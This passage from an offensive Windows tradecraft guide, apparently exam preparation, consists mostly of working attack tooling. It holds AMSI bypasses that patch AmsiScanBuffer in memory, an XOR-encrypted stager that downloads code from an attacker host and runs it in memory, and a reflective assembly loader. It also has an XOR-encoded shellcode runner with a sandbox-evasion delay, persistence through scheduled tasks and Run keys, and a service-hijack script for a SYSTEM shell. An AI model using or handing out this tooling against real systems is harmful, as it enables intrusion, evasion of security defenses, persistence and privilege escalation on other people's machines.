            # Version 4: memory patch (change first bytes of AmsiScanBuffer to ret)
            try {
                $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out old);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
"@
                Add-Type -TypeDefinition $k -ErrorAction Stop
                [P]::Patch()
                Write-Output "[+] Version 4 done (requires Add-Type allowed)"
            } catch { Write-Output ("[-] Version 4 failed (Add-Type may be blocked): {0}" -f $_.Exception.Message) }
        }
        5 {
            # Version 5: custom Runspace built-in version (pair with CLM environments)
            try {
                $rs = [runspacefactory]::CreateRunspace()
                $rs.Open()
                $ps = [powershell]::Create()
                $ps.Runspace = $rs
                [void]$ps.AddScript({ $ExecutionContext.SessionState.LanguageMode = 'FullLanguage' })
                [void]$ps.Invoke()
                Write-Output "[+] Version 5 done (new Runspace language mode opened)"
            } catch { Write-Output ("[-] Version 5 failed: {0}" -f $_.Exception.Message) }
        }
        6 {
            # Version 6: no handling; report only (control experiment)
            Write-Output "[*] Version 6: no handling applied; control group"
        }
    }
}

if ($ProbeOnly) {
    [void](Test-AmsiActive)
} else {
    [void](Test-AmsiActive)
    Invoke-AmsiVariant -Variant $Variant
    Write-Output ""
    Write-Output "[*] Retest:"
    [void](Test-AmsiActive)
    Write-Output "[*] Tip: versions 1/2/3 are reflection-class and often break after patches; version 4 needs Add-Type;"
    Write-Output "    version 5 pairs with CLM bypass; if all fail, switch to a managed assembly or a non-PowerShell path."
}
````

:::

::: details `m01-stager-download-encrypted.ps1` · click to expand

````powershell
<#
Purpose: Encrypted/obfuscated download-exec stager (fetch stage 2 over HTTP(S) and
      run in memory; no plaintext on disk)
Scenario: 3, 17, 28, 30, 31 (stage 2 scanned / needs proxy awareness / staged)
Dependencies: PowerShell 3.0+
Usage: powershell -ep bypass -f m01-stager-download-encrypted.ps1 -Url http://LHOST/stage2.b64 -XorKey 42
      With proxy: powershell -ep bypass -f m01-stager-download-encrypted.ps1 -Url https://LHOST/s2 -Proxy http://proxy:8080 -ProxyCredential
Placeholders: LHOST/URL (stage-2 address), XorKey (must match attacker encoding)
Test status: Not Windows-lab tested; syntax hand-checked
Notes:
  - Encode on attacker first: python3 m13-xor-encoder.py stage2.ps1 --format b64 --key 42
  - This script only does "fetch + decrypt + IEX"; AMSI handling belongs to the caller
    (see m05-amsi-bypass-variants.ps1)
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Url,
    [int]$XorKey = 42,
    [string]$Proxy = '',
    [switch]$ProxyCredential,
    [switch]$UseDefaultCredentials,
    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
    [switch]$NoExecute
)

function Get-Stage {
    param([string]$Uri)

    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent', $UserAgent)
    if ($Proxy -ne '') {
        $wc.Proxy = New-Object Net.WebProxy($Proxy, $true)
        if ($UseDefaultCredentials) { $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials }
        elseif ($ProxyCredential)     { $wc.Proxy.Credentials = Get-Credential }
    }

    # Self-signed cert case: ignore cert validation (exam environment only)
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }

    Write-Output ("[*] Download: {0}" -f $Uri)
    return $wc.DownloadString($Uri)
}

function Invoke-Decode {
    param([string]$Data, [int]$Key)

    $raw = $null
    # Prefer Base64; on failure treat as raw XOR / hex-ish bytes
    try {
        $bytes = [Convert]::FromBase64String(($Data -replace '\s', ''))
    } catch {
        Write-Output "[!] Not Base64; treating as raw bytes"
        $bytes = [Text.Encoding]::UTF8.GetBytes($Data)
    }
    $out = New-Object byte[] $bytes.Length
    for ($i = 0; $i -lt $bytes.Length; $i++) { $out[$i] = $bytes[$i] -bxor $Key }
    return [Text.Encoding]::UTF8.GetString($out)
}

try {
    $enc = Get-Stage -Uri $Url
    Write-Output ("[*] Received {0} characters" -f $enc.Length)
    $script = Invoke-Decode -Data $enc -Key $XorKey
    Write-Output ("[*] After decrypt: {0} characters" -f $script.Length)

    if ($NoExecute) {
        Write-Output "[*] -NoExecute: printing first 200 characters only"
        Write-Output $script.Substring(0, [Math]::Min(200, $script.Length))
        return
    }

    Write-Output "[*] In-memory execute (no disk)"
    Invoke-Expression $script
} catch {
    Write-Output ("[-] Failed: {0}" -f $_.Exception.Message)
    Write-Output "[*] Triage: (1) is proxy active (-Proxy) (2) is the cert being checked (3) is content blocked by AMSI"
    exit 1
}
````

:::

::: details `m01-reflective-runner.ps1` · click to expand

````powershell
<#
Purpose: Reflectively load a .NET assembly (in-memory; no temp files) as an
      alternative when Add-Type dynamic compile is blocked
Scenario: 4, 3 (Add-Type temp files deleted / need in-memory load of a prebuilt assembly)
Dependencies: PowerShell 3.0+; assembly already on target or delivered (.dll or Base64 bytes)
Usage:
    powershell -ep bypass -f m01-reflective-runner.ps1 -Path payload.dll
    powershell -ep bypass -f m01-reflective-runner.ps1 -Base64 <base64> -Type Payload.Runner -Method Run
Placeholders: LHOST/URL (if using -Url); assembly path/Base64 and entry type set by operator
Test status: Not Windows-lab tested; syntax hand-checked
#>
[CmdletBinding(DefaultParameterSetName = 'Path')]
param(
    [Parameter(ParameterSetName = 'Path', Mandatory = $true)][string]$Path,
    [Parameter(ParameterSetName = 'Base64', Mandatory = $true)][string]$Base64,
    [Parameter(ParameterSetName = 'Url', Mandatory = $true)][string]$Url,
    [string]$Type = '',
    [string]$Method = '',
    [string[]]$Arguments = @(),
    [switch]$ListTypes
)

function Get-AssemblyBytes {
    switch ($PSCmdlet.ParameterSetName) {
        'Path'   { return [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $Path)) }
        'Base64' { return [Convert]::FromBase64String($Base64) }
        'Url'    {
            Write-Output ("[*] Downloading assembly bytes from {0}..." -f $Url)
            return (New-Object Net.WebClient).DownloadData($Url)
        }
    }
}

try {
    $bytes = Get-AssemblyBytes
    Write-Output ("[*] Assembly byte count: {0}" -f $bytes.Length)

    # In-memory load (no disk write)
    $asm = [Reflection.Assembly]::Load($bytes)
    Write-Output ("[+] Loaded: {0}" -f $asm.FullName)

    if ($ListTypes -or -not $Type) {
        Write-Output "[*] Public types:"
        $asm.GetTypes() | Where-Object { $_.IsPublic } | ForEach-Object { Write-Output ("    " + $_.FullName) }
        if (-not $Type) { return }
    }

    $t = $asm.GetType($Type)
    if (-not $t) { throw ("Type not found: {0}" -f $Type) }

    if (-not $Method) {
        # Auto-pick entry: Run → Main → first public static with matching arity
        $candidates = $t.GetMethods([Reflection.BindingFlags]'Public,Static') |
            Where-Object { $_.GetParameters().Count -eq $Arguments.Count }
        $m = $candidates | Where-Object Name -eq 'Run' | Select-Object -First 1
        if (-not $m) { $m = $candidates | Where-Object Name -eq 'Main' | Select-Object -First 1 }
        if (-not $m) { $m = $candidates | Select-Object -First 1 }
    } else {
        $m = $t.GetMethod($Method)
    }
    if (-not $m) { throw "No callable entry method found" }

    Write-Output ("[+] Calling {0}.{1}()" -f $t.FullName, $m.Name)
    $result = $m.Invoke($null, [object[]]$Arguments)
    if ($null -ne $result) { Write-Output ("[+] Return: {0}" -f $result) }
} catch {
    Write-Output ("[-] Failed: {0}" -f $_.Exception.Message)
    Write-Output "[*] Triage order: (1) AMSI block? (run m05-amsi-bypass-variants.ps1 first)"
    Write-Output "             (2) assembly statically detected? (custom Runner / XOR encode)"
    Write-Output "             (3) entry signature mismatch? (use -ListTypes)"
    exit 1
}
````

:::

## `Add-Type` temp files get deleted

If PowerShell works and isn’t in CLM, but `%TEMP%` assemblies from `Add-Type` are deleted, switch to reflective / in-memory load.

```powershell
[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64)).EntryPoint.Invoke($null, @(,[string[]]@()))
```

Precompile the Runner on the attacker side:

```bash
csc /nologo /platform:x64 /out:runner.exe m01-shellcode-runner-x64.cs
```

Embed the assembly as Base64 (fewer on-disk DLLs) and invoke the entry. For `Main`, wrap as `Invoke($null, @(,[string[]]@()))`. Stabilize the session immediately after callback.

If assembly load is blocked by AMSI, do the AMSI handling above first. If the assembly is statically detected, change strings / strip templates, or XOR the shellcode and use pure P/Invoke. If unsigned assemblies are forbidden, use a trusted host (module 05).

::: details `m01-shellcode-runner-x64.cs` · click to expand

````csharp
// Purpose: Custom x64 shellcode Runner (precompile to avoid Add-Type temp files on disk)
// Scenario: 4, 18, 19 (Add-Type blocked / custom EXE statically detected / behavior-detection control)
// Dependencies: .NET Framework 4.x (compile with target csc.exe, or attacker mono/dotnet cross-compile)
// Usage:
//   Target: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
//   Attacker: mcs -out:r.exe m01-shellcode-runner-x64.cs
// Placeholders: SHELLCODE_B64 (Base64 of XOR-encoded x64 shellcode), XOR_KEY
// Test status: Not compile-verified (no csc/mono on this host); syntax hand-checked
//
// Notes:
//   - Shellcode is embedded as a Base64 string (avoids plaintext byte-array static signatures),
//     XOR-decrypted at runtime.
//   - Uses P/Invoke instead of Add-Type-generated temp assemblies, so nothing lands in %TEMP%.
//   - If the target blocks VirtualAlloc+CreateThread behaviorally, switch to Assembly.Load
//     managed path (see m01-reflective-runner.ps1).

using System;
using System.Runtime.InteropServices;
using System.Text;

class Runner
{
    private const string SHELLCODE_B64 = "REPLACE_WITH_BASE64_XOR_SHELLCODE";
    private const byte XOR_KEY = 0x2A;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    private static extern void Sleep(uint dwMilliseconds);

    private static byte[] Decode()
    {
        byte[] data = Convert.FromBase64String(SHELLCODE_B64);
        for (int i = 0; i < data.Length; i++) data[i] ^= XOR_KEY;
        return data;
    }

    public static void Run()
    {
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;

        byte[] sc = Decode();

        const uint MEM_COMMIT_RESERVE = 0x3000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem == IntPtr.Zero)
        {
            Console.Error.WriteLine("VirtualAlloc failed (possibly blocked by ASR/EDR), error " + Marshal.GetLastWin32Error());
            return;
        }

        Marshal.Copy(sc, 0, mem, sc.Length);

        uint tid;
        IntPtr h = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);
        if (h == IntPtr.Zero)
        {
            Console.Error.WriteLine("CreateThread failed, error " + Marshal.GetLastWin32Error());
            return;
        }

        WaitForSingleObject(h, 0xFFFFFFFF);
    }

    public static void Main(string[] args)
    {
        Run();
    }
}
````

:::

## In, but closing Word kills the session

If closing Word kills the session, migrate or persist first — don’t start privilege escalation yet.

Migrate to a same-user resident process:

```text
migrate <PID>          # same user, same bitness
```

Without a migrate helper, spawn the payload detached via `CreateProcess` so it outlives the parent.

User-level persistence hook (optional for the exam, stops mid-run drops):

```cmd
schtasks /create /sc onlogon /tn Updater /tr "C:\Users\Public\update.exe" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\Public\update.exe" /f
```

Close Word and confirm the session stays up. With admin rights, service-level persistence: `m06-service-hijack.ps1`.

If migrate fails, pick a **same-user, same-bitness** process, or spawn detached instead of injecting. If injection is blocked, relaunch via scheduled task or `cmd /c start` to detach. If it dies right after migrate, the new host is monitored — try `sihost.exe` or an installed third-party resident.

::: details `m06-service-hijack.ps1` · click to expand

````powershell
<#
Purpose: Full automation for manual service binary hijack — save original config
      (registry export + original exe backup), replace with payload and start the
      service, then one-shot restore
Scenario: docs/06-uac-windows-privesc.md scenario 27 (auto service-privesc tools failed,
      but you confirmed you can change a high-privilege service's binary or ImagePath)
Dependencies: PowerShell 3.0+ (Get-CimInstance); current user can start/stop/reconfigure
      the service; payload already on target (e.g. C:\Windows\Temp\svcpayload.exe)
Usage: hijack first:
      powershell -ep bypass -f m06-service-hijack.ps1 -ServiceName <svc> -PayloadPath C:\Windows\Temp\svcpayload.exe
      # after SYSTEM (whoami), restore:
      powershell -ep bypass -f m06-service-hijack.ps1 -Action Restore -ServiceName <svc>
      # if the directory is not writable but ImagePath is, add -UseImagePath (ImagePath → payload)
Placeholders: TARGET=target host; LHOST/LPORT already baked into the payload;
      USER/PASS modes see m06-service-binary-payload.c
Test status: Not Windows-lab tested (this host is macOS); syntax hand-checked.
      Validate restore logic once on an isolated VM first
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][ValidateSet("Hijack", "Restore")][string]$Action = "Hijack",
    [Parameter(Mandatory = $true)][string]$ServiceName,
    [string]$PayloadPath = "C:\Windows\Temp\svcpayload.exe",
    [switch]$UseImagePath,            # when directory not writable, point ImagePath at payload
    [int]$WaitSeconds = 8
)

$ErrorActionPreference = "Stop"
$StateFile = Join-Path $env:TEMP ("m06-" + $ServiceName + "-state.txt")

function Write-Log($m) { Write-Output ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }
function Get-Svc {
    Get-CimInstance Win32_Service -Filter "Name='$ServiceName'" -ErrorAction Stop
}
function Split-BinPath([string]$p) {
    # PathName may be "C:\Program Files\X\svc.exe" --arg; extract bare exe path
    $p = $p.Trim()
    if ($p.StartsWith('"')) { return ($p -split '"')[1] }
    return ($p -split '\s+')[0]
}

if (-not (Get-Svc)) { Write-Log "[-] Service $ServiceName does not exist (names are case-sensitive; check with sc qc)"; exit 1 }

# ================= Restore =================
if ($Action -eq "Restore") {
    if (-not (Test-Path $StateFile)) { Write-Log "[-] State file $StateFile not found — no backup to restore; restore manually from the .reg/backup exe you exported"; exit 1 }
    $s = Get-Content $StateFile | Out-String | ConvertFrom-StringData
    Write-Log "[+] Stopping service and restoring original binary $($s.OriginalPath)"
    try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[!] Stop failed: $($_.Exception.Message) (continue trying to copy)" }
    Start-Sleep -Seconds 1
    try {
        if ($s.BackupPath -and (Test-Path $s.BackupPath)) {
            Copy-Item -Path $s.BackupPath -Destination $s.OriginalPath -Force
            Write-Log "[+] Original exe copied back to $($s.OriginalPath)"
        }
        if ($s.RegBackup -and (Test-Path $s.RegBackup)) {
            reg import $s.RegBackup | Out-Null
            Write-Log "[+] Registry restored from $($s.RegBackup)"
        }
        Remove-Item $StateFile -Force
    } catch { Write-Log "[-] Restore failed: $($_.Exception.Message)"; exit 1 }
    try { Start-Service -Name $ServiceName -ErrorAction Stop; Write-Log "[+] Service restarted with original config (verify: sc query $ServiceName should be RUNNING)" }
    catch { Write-Log "[!] Service failed to start: $($_.Exception.Message) (check whether .reg includes Startup password, etc.)" }
    exit 0
}

# ================= Hijack =================
$svc  = Get-Svc
$bin  = Split-BinPath $svc.PathName
Write-Log "[+] Service: $($svc.Name) | original binary: $bin | run-as: $($svc.StartName)"
if (-not (Test-Path $bin)) { Write-Log "[-] Original binary missing $bin (path has variables? confirm manually)"; exit 1 }
if (-not (Test-Path $PayloadPath)) { Write-Log "[-] Payload missing $PayloadPath; upload first"; exit 1 }

$stamp = Get-Date -Format "yyyyMMdd-HHmmss"
$regBackup = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".reg")
$backupExe = Join-Path $env:TEMP ("m06-" + $ServiceName + "-" + $stamp + ".exe")

Write-Log "[+] Saving original config: reg export + original exe backup"
reg export ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) $regBackup /y | Out-Null
Copy-Item -Path $bin -Destination $backupExe -Force
@("OriginalPath=$bin", "BackupPath=$backupExe", "RegBackup=$regBackup") | Set-Content -Path $StateFile -Encoding Ascii
Write-Log "[+] Backup: exe→$backupExe ; reg→$regBackup"

Write-Log "[+] Stopping service"
try { Stop-Service -Name $ServiceName -Force -ErrorAction Stop } catch { Write-Log "[-] Cannot stop service: $($_.Exception.Message) (pick a stoppable service, or rely on reboot/scheduled trigger)"; exit 1 }

try {
    if ($UseImagePath) {
        Write-Log "[+] Change ImagePath → $PayloadPath (directory not writable alternate)"
        reg add ("HKLM\SYSTEM\CurrentControlSet\Services\" + $ServiceName) /v ImagePath /t REG_EXPAND_SZ /d $PayloadPath /f | Out-Null
    } else {
        Write-Log "[+] Replace binary: $bin ← $PayloadPath"
        Copy-Item -Path $PayloadPath -Destination $bin -Force
    }
    Write-Log "[+] Starting service (trigger payload)"
    Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
    Start-Sleep -Seconds $WaitSeconds
} catch {
    Write-Log "[!] Trigger-stage exception: $($_.Exception.Message) (shell may already have connected — expected; sc start error 1053 still means payload side effects happened)"
}

Write-Log "[*] Verify: attacker listener should have a SYSTEM shell (whoami → nt authority\system)"
Write-Log "[*] After the shell, restore: -Action Restore -ServiceName $ServiceName"
Write-Log "[*] If restore finds exe locked (payload process still alive): taskkill /F /IM <payload name> then re-run Restore"
````

:::

## Cheat sheet

| You want to… | Use |
|---|---|
| Prove the macro and egress | `m01-callback-ping.vba` |
| Learn Office bitness | `m01-detect-arch.vba`, or deliver `archbranch` |
| Run without a child process | `m01-shellcode-runner-vba-*.vba` |
| Beat AMSI | `m05-amsi-bypass-variants.ps1` |
| Survive `Add-Type` deletion | `m01-reflective-runner.ps1` |
| Outlive the document | Migrate / scheduled task / HKCU Run |
